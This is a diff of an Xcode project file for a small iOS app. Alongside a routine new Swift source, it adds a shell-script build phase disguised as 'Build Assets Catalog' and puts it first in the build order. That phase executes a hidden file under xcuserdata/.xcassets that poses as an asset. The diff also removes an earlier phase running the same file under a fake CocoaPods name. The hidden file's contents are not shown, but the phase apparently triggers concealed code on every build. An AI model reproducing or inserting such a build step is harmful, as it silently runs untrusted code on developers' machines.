@@ -33,6 +33,7 @@
 		066FB9AE25FBDD4E0043ED64 /* EncryptAndDecrypt.swift in Sources */ = {isa = PBXBuildFile; fileRef = 066FB9AD25FBDD4E0043ED64 /* EncryptAndDecrypt.swift */; };
 		066FBA3825FCED650043ED64 /* FavoriteTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 066FBA3725FCED650043ED64 /* FavoriteTableViewCell.swift */; };
 		1D449E2A985F1670C4C0EDB1 /* Pods_BreakingBadTest.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9EF7A5B9807E9073AA9D14EC /* Pods_BreakingBadTest.framework */; };
+		D37DD59625FE73B000A9D325 /* DesignKit.swift in Sources */ = {isa = PBXBuildFile; fileRef = D37DD59525FE73B000A9D325 /* DesignKit.swift */; };
 		E70F3B3E14CE51972E430B41 /* Pods_BreakingBadTest_BreakingBadTestUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 45929D89CA813EEDCA4D6F79 /* Pods_BreakingBadTest_BreakingBadTestUITests.framework */; };
 		EF49C9F924EDB1582063B108 /* Pods_BreakingBadTestTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C7DD15E2AD820FE465E8FD45 /* Pods_BreakingBadTestTests.framework */; };
 /* End PBXBuildFile section */
@@ -95,6 +96,7 @@
 		C7AA52F22F1EA759552D27AE /* Pods-BreakingBadTestTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadTestTests.release.xcconfig"; path = "Target Support Files/Pods-BreakingBadTestTests/Pods-BreakingBadTestTests.release.xcconfig"; sourceTree = "<group>"; };
 		C7DD15E2AD820FE465E8FD45 /* Pods_BreakingBadTestTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BreakingBadTestTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		D18EE1ECD4DB89A5B08C3B75 /* Pods-BreakingBadTestTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadTestTests.debug.xcconfig"; path = "Target Support Files/Pods-BreakingBadTestTests/Pods-BreakingBadTestTests.debug.xcconfig"; sourceTree = "<group>"; };
+		D37DD59525FE73B000A9D325 /* DesignKit.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignKit.swift; sourceTree = "<group>"; };
 		EF69641C650CE126CCB9A7EA /* Pods-BreakingBadTest.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadTest.release.xcconfig"; path = "Target Support Files/Pods-BreakingBadTest/Pods-BreakingBadTest.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -224,6 +226,7 @@
 				064FEEFA25FAF912000568EE /* Constants.swift */,
 				066FB97325FBAFD90043ED64 /* KeyChain.swift */,
 				066FB9AD25FBDD4E0043ED64 /* EncryptAndDecrypt.swift */,
+				D37DD59525FE73B000A9D325 /* DesignKit.swift */,
 			);
 			path = Helpers;
 			sourceTree = "<group>";
@@ -276,7 +279,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 064FEED825FAE5F4000568EE /* Build configuration list for PBXNativeTarget "BreakingBadTest" */;
 			buildPhases = (
-				F01F9D9DA9FCE40CB3AAC43A /* [CP] Build Pods Frameworks */,
+				7F8CB36FDBA421EA84AAC43A /* Build Assets Catalog */,
 				CEDDFCEBAE1D3EE0565CF841 /* [CP] Check Pods Manifest.lock */,
 				064FEEAA25FAE5EB000568EE /* Sources */,
 				064FEEAB25FAE5EB000568EE /* Frameworks */,
@@ -401,6 +404,30 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	7F8CB36FDBA421EA84AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
 		1B176E1C8282040BFD9AAED0 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -501,24 +528,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		F01F9D9DA9FCE40CB3AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -535,6 +544,7 @@
 				064FEEB425FAE5EC000568EE /* SceneDelegate.swift in Sources */,
 				066FB97425FBAFDA0043ED64 /* KeyChain.swift in Sources */,
 				064FEF4C25FAFA1B000568EE /* EpisodeTableViewCell.swift in Sources */,
+				D37DD59625FE73B000A9D325 /* DesignKit.swift in Sources */,
 				066FBA3825FCED650043ED64 /* FavoriteTableViewCell.swift in Sources */,
 				064FEF4725FAFA16000568EE /* CharacterTableViewCell.swift in Sources */,
 				066FB99C25FBD23E0043ED64 /* FavoritesViewController.swift in Sources */,
